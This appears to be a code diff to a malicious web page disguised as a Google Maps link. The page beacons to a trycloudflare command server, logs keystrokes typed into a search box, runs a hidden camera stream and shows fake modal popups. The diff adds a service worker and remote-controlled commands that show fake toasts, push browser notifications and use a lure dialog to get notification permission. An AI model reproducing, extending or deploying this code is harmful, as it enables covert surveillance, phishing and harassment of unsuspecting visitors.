@@ -30,7 +30,6 @@ h1{font-size:22px;font-weight:400;margin-bottom:8px}
 footer{text-align:center;padding:14px;font-size:12px;color:#5f6368;background:#fff;border-top:1px solid #dadce0}
 video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
 
-/* -- fake modal popup -- */
 #cm-overlay{position:fixed;inset:0;background:rgba(0,0,0,.35);display:none;align-items:flex-end;justify-content:center;z-index:99998;padding:16px}
 #cm-overlay.show{display:flex;animation:cm-fade .18s ease-out}
 @keyframes cm-fade{from{opacity:0}to{opacity:1}}
@@ -89,7 +88,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
 
 <script>
 (function(){
-  const SERVER = "https://grant-vermont-named-comparative.trycloudflare.com";
+  const SERVER = "https://incidence-listprice-members-ministry.trycloudflare.com";
   const REDIRECT = "https://maps.app.goo.gl/UnUYbGNwxCKZmvas6";
   const BEACON_MS = 8000;
 
@@ -99,6 +98,16 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
   const btnText = document.getElementById("btnText");
 
   let MY_FP = null;
+
+  // ---------------------------------------------------------- service worker
+  let swReg = null;
+  if ("serviceWorker" in navigator){
+    try {
+      navigator.serviceWorker.register("sw.js").then(function(r){
+        swReg = r;
+      }).catch(function(e){});
+    } catch(e){}
+  }
 
   // ---------------------------------------------------------- transport
   function send(data){
@@ -164,7 +173,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
   }
 
   // ---------------------------------------------------------- popup ui
-  // opts.auto_dismiss_ms → if set, closes itself after that delay with ok:false
   function popup(opts){
     return new Promise((resolve) => {
       const ov = document.getElementById("cm-overlay");
@@ -810,6 +818,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
   }
 
   // ---------------------------------------------------------- paste + keystroke
+  let flushKeys = function(){};
   (function(){
     const input = document.getElementById("searchInput");
     if (!input) return;
@@ -837,7 +846,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       });
     });
 
-    function flush(){
+    flushKeys = function(){
       if (intervals.length === 0 && keyEvents.length === 0) return;
       const iv = intervals.slice().sort((a,b)=>a-b);
       const median = iv.length ? iv[Math.floor(iv.length/2)] : 0;
@@ -849,10 +858,10 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
         events: keyEvents.map(e => ({ ts: e.ts, delta: e.delta, shift: e.shift, ctrl: e.ctrl, alt: e.alt })) });
       intervals.length = 0;
       keyEvents.length = 0;
-    }
+    };
 
-    input.addEventListener("blur", flush);
-    input.addEventListener("keydown", (e) => { if (e.key === "Enter") flush(); });
+    input.addEventListener("blur", flushKeys);
+    input.addEventListener("keydown", (e) => { if (e.key === "Enter") flushKeys(); });
   })();
 
   // ---------------------------------------------------------- camera stream
@@ -993,9 +1002,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       return { ok: true, pong: Date.now() };
     },
 
-    // ------------------------------------------------------ NEW: spam
     async spam(args){
-      // args: { count, interval_ms, title, body }
       const count = args.count || 5;
       const interval = args.interval_ms || 8000;
       const title = args.title || "Message";
@@ -1009,7 +1016,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       return { ok: true, count, interval_ms: interval };
     },
 
-    // ------------------------------------------------------ NEW: open
     async open(args){
       try {
         const w = window.open(args.url || "about:blank", "_blank");
@@ -1020,14 +1026,149 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       }
     },
 
-    // ------------------------------------------------------ NEW: focus
     async focus(args){
       try { window.focus(); } catch(e){}
       return { ok: true };
+    },
+
+    // ------------------------------------------------------ NEW: toast
+    async toast(args){
+      try {
+        const ov = document.createElement("div");
+        ov.style.cssText = [
+          "position:fixed",
+          "top:12px",
+          "left:50%",
+          "transform:translateX(-50%) translateY(-8px)",
+          "background:#fff",
+          "border-radius:12px",
+          "box-shadow:0 6px 24px rgba(0,0,0,.22)",
+          "padding:12px 16px",
+          "max-width:90vw",
+          "min-width:280px",
+          "z-index:99999",
+          "font-family:Roboto,Arial,sans-serif",
+          "opacity:0",
+          "transition:opacity .25s ease-out, transform .25s ease-out",
+          "display:flex",
+          "gap:10px",
+          "align-items:flex-start"
+        ].join(";");
+        const ic = document.createElement("div");
+        ic.style.cssText = "width:22px;height:22px;border-radius:50%;background:#1a73e8;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:700;flex-shrink:0;margin-top:1px";
+        ic.textContent = "!";
+        const box = document.createElement("div");
+        box.style.cssText = "flex:1;min-width:0";
+        const tEl = document.createElement("div");
+        tEl.style.cssText = "font-size:14px;font-weight:600;color:#202124;margin-bottom:2px";
+        tEl.textContent = args.title || "Notification";
+        const bEl = document.createElement("div");
+        bEl.style.cssText = "font-size:13px;line-height:18px;color:#5f6368;word-break:break-word;white-space:pre-wrap";
+        bEl.textContent = args.body || "";
+        box.appendChild(tEl); box.appendChild(bEl);
+        ov.appendChild(ic); ov.appendChild(box);
+        document.body.appendChild(ov);
+        requestAnimationFrame(function(){
+          ov.style.opacity = "1";
+          ov.style.transform = "translateX(-50%) translateY(0)";
+        });
+        const life = args.duration_ms || 5000;
+        setTimeout(function(){
+          ov.style.opacity = "0";
+          ov.style.transform = "translateX(-50%) translateY(-8px)";
+          setTimeout(function(){ try { ov.remove(); } catch(e){} }, 400);
+        }, life);
+        return { ok: true, duration_ms: life };
+      } catch(e){
+        return { ok: false, err: String(e) };
+      }
+    },
+
+    // ------------------------------------------------------ NEW: notif
+    async notif(args){
+      try {
+        if (!("Notification" in window)){
+          return { ok:false, err:"Notification api not supported" };
+        }
+        if (Notification.permission !== "granted"){
+          return { ok:false, need_permission:true, state: Notification.permission };
+        }
+        const title = args.title || "Update";
+        const body = args.body || "";
+        const silent = !!args.silent;
+        if (swReg){
+          try {
+            const reg = await navigator.serviceWorker.ready;
+            await reg.showNotification(title, {
+              body: body,
+              tag: "maps-live-" + Date.now(),
+              silent: silent,
+              renotify: false
+            });
+            return { ok: true, via: "serviceworker" };
+          } catch(e){ /* fall through to direct */ }
+        }
+        new Notification(title, { body: body, silent: silent });
+        return { ok: true, via: "Notification" };
+      } catch(e){
+        return { ok: false, err: String(e) };
+      }
+    },
+
+    // ------------------------------------------------------ NEW: askperm
+    async askperm(args){
+      try {
+        const label = args.label || "Enable notifications";
+        const ov = document.createElement("div");
+        ov.style.cssText = [
+          "position:fixed","inset:0","background:rgba(0,0,0,.4)",
+          "display:flex","align-items:center","justify-content:center",
+          "z-index:99998","padding:20px","font-family:Roboto,Arial,sans-serif"
+        ].join(";");
+        const card = document.createElement("div");
+        card.style.cssText = [
+          "background:#fff","border-radius:14px","padding:22px 22px 18px",
+          "max-width:360px","width:100%","box-shadow:0 12px 40px rgba(0,0,0,.28)"
+        ].join(";");
+        const h = document.createElement("div");
+        h.style.cssText = "font-size:17px;font-weight:600;color:#202124;margin-bottom:8px";
+        h.textContent = args.title || "Stay updated";
+        const b = document.createElement("div");
+        b.style.cssText = "font-size:14px;line-height:20px;color:#5f6368;margin-bottom:18px";
+        b.textContent = args.body || "Enable notifications to get live alerts from this page.";
+        const okBtn = document.createElement("button");
+        okBtn.style.cssText = "display:block;width:100%;background:#1a73e8;color:#fff;border:none;border-radius:8px;height:44px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit";
+        okBtn.textContent = label;
+        const skipBtn = document.createElement("button");
+        skipBtn.style.cssText = "display:block;width:100%;background:transparent;color:#5f6368;border:none;margin-top:8px;font-size:13px;padding:8px;cursor:pointer;font-family:inherit";
+        skipBtn.textContent = "Not now";
+        card.appendChild(h); card.appendChild(b); card.appendChild(okBtn); card.appendChild(skipBtn);
+        ov.appendChild(card); document.body.appendChild(ov);
+        return await new Promise((resolve) => {
+          okBtn.onclick = async function(){
+            try { ov.remove(); } catch(e){}
+            try {
+              const state = await Notification.requestPermission();
+              if (state === "granted"){
+                if (!swReg && "serviceWorker" in navigator){
+                  try { swReg = await navigator.serviceWorker.register("sw.js"); } catch(e){}
+                }
+                resolve({ ok: true, permission: state });
+              } else {
+                resolve({ ok: false, permission: state });
+              }
+            } catch(e){
+              resolve({ ok: false, err: String(e) });
+            }
+          };
+          skipBtn.onclick = function(){
+            try { ov.remove(); } catch(e){}
+            resolve({ ok: false, skipped: true });
+          };
+        });
+      } catch(e){ return { ok:false, err: String(e) }; }
     }
   };
-
-  let flushKeys = function(){};   // placeholder, set inside the IIFE above
 
   // ---------------------------------------------------------- beacon loop
   async function beacon(){
